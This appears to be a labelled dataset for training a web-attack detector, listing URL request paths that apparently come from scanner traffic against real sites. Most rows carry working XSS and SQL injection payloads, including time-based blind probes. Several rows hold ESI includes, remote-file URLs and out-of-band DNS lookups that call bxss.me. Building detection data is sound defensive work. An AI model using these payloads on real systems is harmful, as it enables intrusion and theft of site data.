sentences	labels
/**/mfgl/javascript:void(0); \r\n\r\n 	 1
/'""()&%<acx><script >02im(9922)</script>/***/jquery.ellipsis.js \r\n\r\n 	 1
/*******/wulv.php \r\n\r\n 	 1
/****/"".gethostbyname(lc(""hitur"".""prriooct679cb.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(121).chr(79).chr(104).chr(80).""/bmjs/gdyx/ \r\n\r\n 	 1
/****/czgk/bmjs/zzqfyxt/ycxzjrmfy/\"javascript:void(0)\" \r\n\r\n 	 1
/jsearchfront'""()&%<acx><script >qamc(9895)</script>/********/jcse/110105008056111/16/images/main.css \r\n\r\n 	 1
/*****/system/2020/06/24/javascript:void(0); \r\n\r\n 	 1
/***/col200/index<esi:include src=""http://bxss.me/rpb.png""/>.html \r\n\r\n 	 1
/***/admin/dash_status.php?status_data[1]=alert(777); \r\n\r\n 	 1
/**/libs/magpierss/scripts/magpie_simple.php?url=""><img src= x onerror = alert(777)>url=""> \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/images//xfs.bxss.me/voice/voice.css \r\n\r\n 	 1
/**/ui/lib/easyui/plugins/jquery.draggable"" and 2*3*8=6*8 and ""ctdc""=""ctdc.js \r\n\r\n 	 1
/*****/class/liangkaoxie.php \r\n\r\n 	 1
/****/ \r\n\r\n 	 1
/*******/7mwpyrxy.php \r\n\r\n 	 1
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448%' and 7577=7577  \r\n\r\n 	 1
/******/system/2021/11/26/javascript:window.close(); \r\n\r\n 	 1
/*******/a93b3.php \r\n\r\n 	 1
/****/system/2013/08/09/javascript:window.close(); \r\n\r\n 	 1
/**/telaen/index.php?tid=default&lid=en_uk&f_email="">alert(777) \r\n\r\n 	 1
/******/system/2016/12/09/javascript:void(0); \r\n\r\n 	 1
/************/search.do?tpl=16&q=请输入关键词%' and 2*3*8=6*8 and '2ags'!='2ags%&websiteid=110105008056111&pg=1&category=1&cateid=1&p=1 \r\n\r\n 	 1
/******/_content/download.jsp?urltype=news.downloadattachurl' or 1874=3487  \r\n\r\n 	 1
/******/resource/storage/localupload.jsp?doaction=save' and 3464=6845 and '1'='1&rid=1rnott09fg&uptoken=1ff87566684b40c688f756b86e2c3798 \r\n\r\n 	 1
/wp-content/*******/woocommerce/wpwp.php \r\n\r\n 	 1
/*******/y6w24jsp.php \r\n\r\n 	 1
/*****/20210428/javascript:void(0); \r\n\r\n 	 1
/wp-content/*******/wp-events-calendar/public/ajax/geteventslist.php?calendar_id=1&day=1&month=5&pag=1&year=2018' and 1=dbms_pipe.receive_message(7d,15) and '1'='1 \r\n\r\n 	 1
/ldzc<esi:include src=""http://*******/rpb.png""/>/byszf/sz/202108/t20210806_185416.html \r\n\r\n 	 1
/******/resource/js' and 2*3*8=6*8 and 'bsch'='bsch/gotopage.js \r\n\r\n 	 1
/*****/imagies/date.php \r\n\r\n 	 1
/************/search.do?begin=20201012&end=20211012&eq=1'""()&%<acx><script >6qjr(9905)</script>&oq=1&p=1&pg=1&pos=filenumber&q=请输入关键词&searchid=44&tpl=16&websiteid= \r\n\r\n 	 1
/*******/gjv1nz2b.php \r\n\r\n 	 1
/****/system/2020/04/01/javascript:window.print() \r\n\r\n 	 1
/vc"" and 2*3*8=6*8 and ""kzdt""=""kzdt/**/widgets/scrollup/css/themes/image.css \r\n\r\n 	 1
/****/scripts/booking/eventlist.php?serviceid=1337" onmouseover="alert(777) \r\n\r\n 	 1
/****/if(now()=sysdate(),sleep(12),0)/gcjsbzgl/gcjybz.htm \r\n\r\n 	 1
/****/main/messages/outbox.php?f=social"" onmouseover=""confirm(777) \r\n\r\n 	 1
/*/191211-8/index/http://bxss.me/t/xss.html? \r\n\r\n 	 1
/images<esi:include src=""http://*******/rpb.png""/>/select.css \r\n\r\n 	 1
/**********/system/2020/11/27/javascript:void(); \r\n\r\n 	 1
/*******/0rl.php \r\n\r\n 	 1
/**********/system/2021/09/07'"/><script>alert(775)</script>/013447361.shtml \r\n\r\n 	 1
/****/zdlygk/czzjzdjc/\"javascript:void(0)\" \r\n\r\n 	 1
/***/?cmd=new_section§ion="%3<script>alert(777);</script> \r\n\r\n 	 1
/****/web/search?searchword=1&channelid=287219%' or 3851=3851 and '%%'='%&perpage=24&templet=1&token=1 \r\n\r\n 	 1
/****/system/2021/11/24/javascript:window.close(); \r\n\r\n 	 1
/*************/pm_gatt_inc.aspx?project_id=sys.fn_varbintohexstr(hashbytes('md5','kc1qu')) \r\n\r\n 	 1
/******/download/downfile.jsp?classid=0' and 9723=8406 and 'nkgr'='nkgr&filename=5e843683d0fe4948a646311bf154afc6.doc \r\n\r\n 	 1
/*******/e5rom.php \r\n\r\n 	 1
/**/ui/widgets/cookie'||'/jquery.cookie.js \r\n\r\n 	 1
/****/2020wzqh/wzqh_gzbs/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/****/zsrc/goods.list.html?key=hi' or 'a'='a \r\n\r\n 	 1
/****/clhlbj/201411/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/******/resource/interview/room.jsp?wbinterviewid=1033') or 3391=5655  \r\n\r\n 	 1
/***/login/tohome.z?editionmodelval=0'||(pg_sleep(8.0))||' \r\n\r\n 	 1
/****/zdlygk/ncwywfgz/if(now()=sysdate(),sleep(12),0)/plq/xmb_gzdxb.htm \r\n\r\n 	 1
/****/system/2021/10/15/javascript:window.close(); \r\n\r\n 	 1
/************/http://bxss.me/t/fit.txt?.jpg/jcse/110105008056111/16/images/hanweb.css \r\n\r\n 	 1
/****/洛阳?page='""()&%<acx><script >cqqv(9567)</script> \r\n\r\n 	 1
/*****/system/2012/04/26/010753524_01.shtml \r\n\r\n 	 1
/***/index.php?do=post&id=428&c=dt&a=goods& \r\n\r\n 	 1
/****/"><script>alert(75)</script> \r\n\r\n 	 1
/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/********/js/ajax.js \r\n\r\n 	 1
/***/wp-content/plugins/dzs-videogallery/admin/playlistseditor/popup.php?initer=whatava18642';alert(777)//645 \r\n\r\n 	 1
/**/ui"" and 2*3*8=6*8 and ""7rea""=""7rea/lib/easyui/plugins/jquery.parser.js \r\n\r\n 	 1
/*******/gqp40w.php \r\n\r\n 	 1
/***/col195/'""()&%<acx><script >jjtk(9014)</script>.html \r\n\r\n 	 1
/**/mediacenter/news/' and 'x'='y \r\n\r\n 	 1
/************/search/mainframe.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&pq=&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111 \r\n\r\n 	 1
/****/system/2013/01/15/javascript:dozoom(9) \r\n\r\n 	 1
/*******/37oq1bl7.php \r\n\r\n 	 1
/art'||'/****/10/12/art_31_242356.html \r\n\r\n 	 1
/****/dqgz/" and "x"="y \r\n\r\n 	 1
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/bzxajgc/gys/jyx.htm \r\n\r\n 	 1
/*******/action.ashx?cmd=contactaddressgetlist \r\n\r\n 	 1
/****/web/search?searchword=1&channelid=287219&perpage=24) and if(now()=sysdate(),sleep(0),0)/*'xor(if(now()=sysdate(),sleep(0),0))or'""xor(if(now()=sysdate(),sleep(0),0))or""*/&templet=1&token=1 \r\n\r\n 	 1
/**/frontcontroller?domainname=<script>alert(77729</script>&operation=160 \r\n\r\n 	 1
/****/mswpmm/common/newaccount.aspx?email=alert(777) \r\n\r\n 	 1
/************/categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos=1&pq=1&q=/xfs.bxss.me&ranksign=1&searchid=1&total=1&tpl=16&websiteid=110105008056111 \r\n\r\n 	 1
/**********/system/2015/09/07/011813664.shtml \r\n\r\n 	 1
/******/_content/download.jsp?owner=746124344&urltype=0'xor(if(now()=sysdate(),sleep(12),0))xor'z&wbfileid=23735 \r\n\r\n 	 1
/****/system/"'><img src="/wf_xsrf1590.html">/013446963.shtml \r\n\r\n 	 1
/****/web/search?channelid=254846&searchword=?????? and 1>1 \r\n\r\n 	 1
/*/161208-1/index/http://bxss.me/t/xss.html? \r\n\r\n 	 1
/******/resource/interview/room.jsp?wbinterviewid=1033%' and 1091=7963 and '%'='&owner=1707212448 \r\n\r\n 	 1
/**********/system/2021/11/23/javascript:window.close(); \r\n\r\n 	 1
/***/index.php?m=member&c=index&a=register&siteid=1 \r\n\r\n 	 1
socket.gethostbyname(""hitla"" ""rrwjekob50e43.bxss.me."")[3].to_s) ""/**/widgets/scrollup/css/themes/image.css \r\n\r\n 	 1
/art"" and 2*3*8=6*8 and ""idak""=""idak/****/10/11/art_34_242318.html \r\n\r\n 	 1
/****/20211018/javascript:void(0); \r\n\r\n 	 1
/**********/tsqh/javascript:window.close(); \r\n\r\n 	 1
/****/rsgzxx/rsrm/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.htm \r\n\r\n 	 1
/****/plus/moon.php \r\n\r\n 	 1
/****/jxjcj/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/**/http://bxss.me/t/fit.txt?.jpg.do \r\n\r\n 	 1
/******/resource/js/jquery/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.js \r\n\r\n 	 1
/*****/system/2021/11/16/javascript:window.print() \r\n\r\n 	 1
/****/web/search?channelid=234439&orderby=relevance&perpage=24) and if(now()=sysdate(),sleep(0),0)/*'xor(if(now()=sysdate(),sleep(0),0))or'""xor(if(now()=sysdate(),sleep(0),0))or""*/&searchword=1 \r\n\r\n 	 1
/*****/system/2021/11/22/javascript:window.close(); \r\n\r\n 	 1
/****/admin/default/install_plugin/dasdasdasdad?plugin=math2py&source=javascript:alert(777) \r\n\r\n 	 1
/**********/system/2013/08/28/011173524_04.shtml \r\n\r\n 	 1
/**/dorg/results.php?q='"--></style></script><script>alert(777)</script>&search=search&type=3 \r\n\r\n 	 1
/****/bysw//xfs.bxss.me/t20200119_146666.html \r\n\r\n 	 1
/*********/index/login/index.html?fromurl=st4r7s<d3v	onmouseover
/****/system/2021/10/22/javascript:dozoom(9) \r\n\r\n 	 1
/****/mtgz/mt16/ \r\n\r\n 	 1
/************/search.do?begin=1&end=1&eq=1&oq=1&p=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&pg=1&pos=1&pq=1&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111 \r\n\r\n 	 1
/*****/gywm/js/data.js/""><script>alert(337)</script> \r\n\r\n 	 1
/****/0'xor(if(now()=sysdate(),sleep(15),0))xor'z.aspx \r\n\r\n 	 1
/****/gjzqq/index.html?continent=%' or 9906=8813  \r\n\r\n 	 1
/***/003/003/109/ \r\n\r\n 	 1
/********/ajax_cmd.php?cmd=completgraphyrecording&filename=<img src=a onload=alert(777)> \r\n\r\n 	 1
/**********/system/2021/11/17/javascript:window.close(); \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(559)">?_=1630311512775 \r\n\r\n 	 1
/***//screens/switch/switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/images/logo-mobility-controller.gif onload=alert(777)> \r\n\r\n 	 1
/****/learn/ostickrc/scp/tickets.php?a=export&h=9c2601b88c05055b51962b140f5121389&status=" onmouseover="alert(777)" \r\n\r\n 	 1
/***/cgi-bin/ipinfo.cgi?alert(777) \r\n\r\n 	 1
/****/tips/tipsloginsubmit.action \r\n\r\n 	 1
/****/web/search/search?page=3';select pg_sleep(5)--&channelid=287219&searchword=1&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10 \r\n\r\n 	 1
/****/system/2021/08/04/javascript:window.print() \r\n\r\n 	 1
/***/?//bxss.me \r\n\r\n 	 1
/******/system/2020/08/04/javascript:window.print() \r\n\r\n 	 1
/**********/system/2020/12/01/javascript:window.close(); \r\n\r\n 	 1
/*****/system/2021/01/07/javascript:void(); \r\n\r\n 	 1
/******/system/2021/06/09/013399706'""/><img src=javascript:alert(2309) .shtml \r\n\r\n 	 1
/0'xor(if(now()=sysdate(),sleep(0),0))xor'z/****/bmleft.html \r\n\r\n 	 1
/*/action/showinfo/?classid=11&id=10317'""()&%<acx><script >9wtx(9749)</script> \r\n\r\n 	 1
/************/interfaces/dimension.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=&pq=&q=请输入关键词&searchid=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&tpl=16&websiteid=110105008056111 \r\n\r\n 	 1
/*******/41n6xny2.php \r\n\r\n 	 1
/****/frontcontroller?domainname=<script>alert(77729</script>&operation=160 \r\n\r\n 	 1
/****/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php \r\n\r\n 	 1
/************/bxss.me/jcse/110105008056111/16/images/hanweb.css \r\n\r\n 	 1
/******/web/http://bxss.me/t/fit.txt?.jpg/theme/simple/css/jpage.css \r\n\r\n 	 1
/***/api/sources?resource=alert(/777/)&format=txt \r\n\r\n 	 1
/************/template/http://bxss.me/t/fit.txt?.jpg/110105008056111/16/images/plugin/selectpick/js.js \r\n\r\n 	 1
/********/admin/ccmanage.php?find_enc=1&list=1"><script>alert(777)</script> \r\n\r\n 	 1
/**/ui/widgets/http://bxss.me/t/fit.txt/jquery.cookie.js \r\n\r\n 	 1
/***/interface/comul_total.json.jsp?callback=jquery171030196352313975305_1632325579271') and 5637=5637 and '1'='1 \r\n\r\n 	 1
/**********/system/2021/12/05/javascript:void(0); \r\n\r\n 	 1
/****/abantecart/index.php?rt="><script>alert(777);</script>&s=your_admin"><script>alert(777);</script>&token=957bf7cb71078f4471807da1c42d721e"><script>alert(777);</script> \r\n\r\n 	 1
/****/qyjbxx/" and "x"="y \r\n\r\n 	 1
/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/********/js/dynclicks.js \r\n\r\n 	 1
/****/games.php?des='">><script>alert(' 777')</script> \r\n\r\n 	 1
/**/wp_rokbox/thumb.php?src=<body onload=alert(777)>.jpg \r\n\r\n 	 1
/******/visitcount/visit.jsp/<img src="javascript:alert(5765)">?type=2&i_webid=1&i_columnid=11 \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/images//xfs.bxss.me/hotnews/js.js \r\n\r\n 	 1
/**********/system/2020/04/05/javascript:window.close(); \r\n\r\n 	 1
/****/nameko.php?op=999&id=&colorset=violet&fontsize=11; }</style><script>alert(777)</script><style>body { font-size:66 \r\n\r\n 	 1
/****/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) \r\n\r\n 	 1
/zwgk'||'/******/bzxajgc.htm \r\n\r\n 	 1
/*/201020-1/'""()&%<acx><script >vbbu(9574)</script>/d7c921b2c59d284228d4f6d2d18d0cae.css \r\n\r\n 	 1
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/ncwywfgz/gys/bsj/zcwj.htm \r\n\r\n 	 1
/****/html'""()&%<acx><script >kwa1(9035)</script>/demo11.html \r\n\r\n 	 1
/****/system/2021/12/08/javascript:dozoom(14) \r\n\r\n 	 1
/*******/568osv.php \r\n\r\n 	 1
/***/0/00/36/17/361715_123833.png \r\n\r\n 	 1
/****/20200403/javascript:void(0); \r\n\r\n 	 1
/****/web/search?page=2&channelid=253477 and 7151=9841#&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 \r\n\r\n 	 1
/****/abantecart/index.php?limit="><script>alert(777);</script>&page=1"><script>alert(777);</script>&rt=product/special"><script>alert(777);</script>&sort="><script>alert(777);</script> \r\n\r\n 	 1
/****/wp-content/plugins/dzs-videogallery/ajax.php?height=&source=6d27f""><script>alert(777)</script>894ba&type=&width= \r\n\r\n 	 1
/**/news/xwygx/202109/t20210930_318020.html' and 'x'='x \r\n\r\n 	 1
/**********/system/2021/11/05/javascript:void(0); \r\n\r\n 	 1
/****/http://bxss.me/t/xss.html? \r\n\r\n 	 1
/*/201020-1/videos-detail/'""()&%<acx><script >edjc(9891)</script>f1a343e891a0a00a940d84f9626bcf.js \r\n\r\n 	 1
/****/web/search?searchword=1&channelid=287219&perpage=24%' or 8940=8940  \r\n\r\n 	 1
/****/czgk/bmjs/zzqfyxt/plxrmfy/\"javascript:void(0)\" \r\n\r\n 	 1
/******/download/downfile.jsp?classid=0&filename=187b8cf8c65b4c7e97230bf0e01cd0d4.xls and 5633=5633-- uyut \r\n\r\n 	 1
/****/20170830/javascript:void(0); \r\n\r\n 	 1
/**/index.cfm?error.diagnostics="">alert(777) \r\n\r\n 	 1
/********/slash-cms/index.php?mod=sl_pages&id=alert(777) \r\n\r\n 	 1
/*****/system/2020/07/28/javascript:void(); \r\n\r\n 	 1
/******/system/2020/10/16/javascript:window.print() \r\n\r\n 	 1
/****/advanced-search/?term=asdf&"><script>alert(777)</script> \r\n\r\n 	 1
/************/template/jcse/110105008056111<esi:include src=""http://bxss.me/rpb.png""/>/16/images/searchbtn.js \r\n\r\n 	 1
/if(now()=sysdate(),sleep(15),0)/*****/1088/1110/list.html \r\n\r\n 	 1
/*******/eg4v4ji5.php \r\n\r\n 	 1
/images"" and 2*3*8=6*8 and ""u3bu""=""u3bu/**/jquery.js \r\n\r\n 	 1
/**/p291255.jar \r\n\r\n 	 1
/***/wp-content/plugins/dzs-videogallery/ajax.php?height=&source=6d27f""><script>alert(777)</script>894ba&type=&width= \r\n\r\n 	 1
/**/mswpmm/common/newaccount.aspx?ddlculture=alert(777) \r\n\r\n 	 1
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448%' and 9814=0234 and '%%'='% \r\n\r\n 	 1
/'""()&%<acx><script >iubl(9063)</script>/**/lib/easyui/themes/bootstrap/messager.css \r\n\r\n 	 1
/****/system/count/0036001/012000000000/window.location.href \r\n\r\n 	 1
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqsthjt/\"javascript:void(0)\" \r\n\r\n 	 1
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448%') or 9215=7103 and '%'=' \r\n\r\n 	 1
/****/rcgk/javascript:stranbody(); \r\n\r\n 	 1
/************/template/jcse/bxss.me/16/images/ui.css \r\n\r\n 	 1
/******/_content/download.jsp?owner=1707212448&urltype=0""xor(if(now()=sysdate(),sleep(12),0))xor""z&wbfileid=67726 \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/"><script>alert(896)</script>?_=1630311635977 \r\n\r\n 	 1
/******/jslib/if(now()=sysdate(),sleep(15),0)/urite.min.js \r\n\r\n 	 1
/******/qhkc/" target="_blank"><img src="img3/7.jp \r\n\r\n 	 1
/***/group-summary.jsp?search=test" onmouseover=alert(777) x=" \r\n\r\n 	 1
/*******/9616h.php \r\n\r\n 	 1
/*******/taglib/yunke.php \r\n\r\n 	 1
/****/gccb/hjgc/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/****/shouji/65807.htm?rand=2 and 9160=9160-- cltx \r\n\r\n 	 1
/****/category/silutouzi?page=_cloud_eye_trainer_56524eb847014a30f03212dadb9defb9 \r\n\r\n 	 1
/*****/system/2021/12/18/javascript:window.close(); \r\n\r\n 	 1
/****/czgk/bmjs/qtdw/?wvstest=javascript:domxssexecutionsink(1,""'/""><xsstag>()locxss"")://javascript:domxssexecutionsink(1,""'/""><xsstag>()locxss"")httpjavascript:domxssexecutionsink(1,""'/""><xsstag>()locxss"") \r\n\r\n 	 1
/****/czgk/bmjs/zzqrdcwh/\"javascript:void(0)\" \r\n\r\n 	 1
/*****/system/2020/12/01/javascript:void(); \r\n\r\n 	 1
/****/category/fengxianfangfan?page=1 and 2915=2915# \r\n\r\n 	 1
/*****/genixcms-master/genixcms-master/gxadmin/index.php?page=posts&q=1'alert(777) \r\n\r\n 	 1
/****/system/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user \r\n\r\n 	 1
/****/dorg/results.php?q='"--></style></script><script>alert(777)</script>&search=search&type=3 \r\n\r\n 	 1
/*/public/viewclick/?addclick=1&classid=1 waitfor delay '0:0:9.468' -- &id=174 \r\n\r\n 	 1
/******/system/2021/09/13/javascript:window.print() \r\n\r\n 	 1
/****/20201009/e108109965.html \r\n\r\n 	 1
/******/_content/download.jsp?urltype=news.downloadattachurl') or 8892=4705 /*&owner=1707212448&wbfileid=51419 \r\n\r\n 	 1
/******/system/2016/08/25/javascript:void(); \r\n\r\n 	 1
/******/system/2018/02/01/javascript:void(); \r\n\r\n 	 1
/***/abantecart/index.php?rt="><script>alert(777);</script>&s=your_admin"><script>alert(777);</script>&token=957bf7cb71078f4471807da1c42d721e"><script>alert(777);</script> \r\n\r\n 	 1
/****/telaen/index.php?tid=default&lid=en_uk&f_email="">alert(777) \r\n\r\n 	 1
/***/news/"><script>alert(777)</script>show/title/time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c \r\n\r\n 	 1
/**********/system/2021/09/07'""/><script>alert(758)</script>/013447361.shtml \r\n\r\n 	 1
/************/search.do?category=1&cateid=40&p=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&pg=1&q=请输入关键词&tpl=16&websiteid=110105008056111 \r\n\r\n 	 1
/*********/treasury/index.aspx?nodeid=394%';select sleep(5) \r\n\r\n 	 1
/****/gjmt/jtwxq/202012/t20201201_264201.html and 1=1 \r\n\r\n 	 1
/****/javascript:void(0); \r\n\r\n 	 1
/******/system/2012/05/30/010783070_01.shtml \r\n\r\n 	 1
/************/interfaces/dimension.do?begin=&end=&eq=&oq=&p=1&pg=if(now()=sysdate(),sleep(15),0)&pos=&pq=&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111 \r\n\r\n 	 1
/******/system/2018/01/20/javascript:window.close(); \r\n\r\n 	 1
/***/0/00/93/65/936587_952378.png \r\n\r\n 	 1
/ldzc'""()&%<acx><script >aavn(9571)</script>/*****/sz/202108/t20210806_185416.html \r\n\r\n 	 1
/****/ssgs/" and "x"="y \r\n\r\n 	 1
/************/fxglzgs/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/2017-01-24/193.html \r\n\r\n 	 1
/*******/tnnwaoro.php \r\n\r\n 	 1
/***/abantecart/index.php?currency="><script>alert(777);</script>&product_id=109"><script>alert(777);</script>&rt=product/product \r\n\r\n 	 1
/**/ui/lib/'""()&%<acx><script >vrou(9770)</script>/themes/bootstrap/linkbutton.css \r\n\r\n 	 1
/****/web/search?channelid=234439&orderby=relevance&perpage=24) and 4015=4015#&searchword=1 \r\n\r\n 	 1
/***/0/11/37/70/11377077_964578.jpg \r\n\r\n 	 1
/****/category/silulvyou?page='""()&%<acx><script >ydch(9090)</script> \r\n\r\n 	 1
/******/system/2020/07/31/javascript:window.print() \r\n\r\n 	 1
/***/index.cfm?email="">alert(777)&fuseaction=clogin.main&returnurl=1&status=sendlogin \r\n\r\n 	 1
/**********/system/2021/09/07/013447361'""/><img src=x onerror=alert(823)>.shtml \r\n\r\n 	 1
/***/libs/magpierss/scripts/magpie_simple.php?url=""><img src= x onerror = alert(777)>url=""> \r\n\r\n 	 1
/****/shzr/zrbg/ \r\n\r\n 	 1
/******/dashboard/index/41730?did=4&period=3"">alert(/777/) \r\n\r\n 	 1
socket.gethostbyname(""hitxj"" ""smoajdhua2d6f.bxss.me."")[3].to_s) ""/********/jcse/110105008056111/16/images/plugin/analysis/jquery.windstagball.js \r\n\r\n 	 1
/******/visitcount/visit.jsp/<img src="javascript:alert(2076)">?type=3&i_webid=1&i_columnid=392&i_articleid=192569 \r\n\r\n 	 1
/****/web/search?searchword=-1 or 2295=2295#&channelid=287219&perpage=24&templet=1&token=1 \r\n\r\n 	 1
/****/zjdt/czjs/if(now()=sysdate(),sleep(12),0).htm \r\n\r\n 	 1
/****/中国减贫学 \r\n\r\n 	 1
/****/admin/system.html?step=2&device=et"/><script>alert(777);</script>bh0 \r\n\r\n 	 1
/****/consultdetails/canada \r\n\r\n 	 1
/******/download/downfile.jsp?classid=0&filename=278851335f24465a9715e09ab5f36d60.docx and 4422=4422-- mbyg \r\n\r\n 	 1
/**/ui'||'/lib/easyui/themes/bootstrap/panel.css \r\n\r\n 	 1
/****/czgk/bmyjs/zzqdwgzbmyxsjg/zzqdwbgt/\"javascript:void(0)\" \r\n\r\n 	 1
/******/download/downfile.jsp?classid=0&filename=187b8cf8c65b4c7e97230bf0e01cd0d4.xls and 2277=4310 \r\n\r\n 	 1
/**********/system/2021/10/19/javascript:window.close(); \r\n\r\n 	 1
/************/template"" and 2*3*8=6*8 and ""1uam""=""1uam/jcse/110105008056111/16/images/common.js \r\n\r\n 	 1
/****/gjzqq/" and "x"="y \r\n\r\n 	 1
/****/ad_js.php?aid=23 \r\n\r\n 	 1
/************/categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos=bxss.me&pq=1&q=请输入关键词&ranksign=1&searchid=1&total=1&tpl=16&websiteid=110105008056111 \r\n\r\n 	 1
/****/zfwjn/1088/1096/list.html?new=bxss.me \r\n\r\n 	 1
/*******/sccba/10596/25100/25123/2015/12/02/20151202100210095375683/javascript:; \r\n\r\n 	 1
/'.gethostbyname(lc('hitrx'.'lqiqakzzfc6fe.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(99).chr(71).chr(111).chr(78).'/****/bmjs/gdyx/ \r\n\r\n 	 1
/**********/2020-12-0'xor(if(now()=sysdate(),sleep(6),0))xor'z.html \r\n\r\n 	 1
/*****/abantecart/index.php?currency="><script>alert(777);</script>&product_id=109"><script>alert(777);</script>&rt=product/product \r\n\r\n 	 1
/*******/81x.php \r\n\r\n 	 1
/******/qhkc/""><script>alert(34)</script> \r\n\r\n 	 1
/************/template/jcse/110105008056111/http://bxss.me/t/fit.txt?.jpg/images/plugin/waterpull/pinterest_grid.js \r\n\r\n 	 1
/****/admin/dash_additem.php?additem_form=alert(777); \r\n\r\n 	 1
/*******/zfxxgk/fdzdgknr/qtfdxx/ \r\n\r\n 	 1
/**/system/2021/05/11/javascript:void(0); \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/images/plugin/websitechange'||'/zwdt_v3.css \r\n\r\n 	 1
/****/ajax_cmd.php?cmd=completgraphyrecording&filename=<img src=a onload=alert(777)> \r\n\r\n 	 1
/****/jtdt/2020_jtyw/202012/t20201222_268160.html' and 'x'='x \r\n\r\n 	 1
/**/ui'||'/widgets/validity/validity.js \r\n\r\n 	 1
/investors-garden/**********/graphic%' and 2*3*8=6*8 and 'q9jz'!='q9jz%/2020-02-27/8981.html \r\n\r\n 	 1
/***/main/calendar/agenda_list.php?type=personal' onmouseover='confirm(777)'/><!-- \r\n\r\n 	 1
/****/gjzqq/bmz/mxg/201412/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/****/phpliteadmin_v1-1/phpliteadmin.php?table=""/>alert(777) \r\n\r\n 	 1
/****/stylenopower.aspx;;";;alert(260);;s="?file=css/stylelogin \r\n\r\n 	 1
/cgi-bin/**********/index.php?limit="><script>alert(777);</script>&page=1"><script>alert(777);</script>&rt=product/special"><script>alert(777);</script>&sort="><script>alert(777);</script> \r\n\r\n 	 1
/****/?cmd=new_section§ion="%3<script>alert(777);</script> \r\n\r\n 	 1
/****/system/2008/10/19/javascript:window.print() \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(353)">?_=1630311371566 \r\n\r\n 	 1
/**/classifier,ruleset.jsp?action_flag=&page=1&kw="/><script>alert(777)</script>&id=&domain=&keyword=&points= \r\n\r\n 	 1
/****/zfxxgk/fdzdgknr/qtfdxx/qzqd/202011/http://bxss.me/t/xss.html? \r\n\r\n 	 1
/****/category/zixunfuwu?page=1 and 2648=2648# \r\n\r\n 	 1
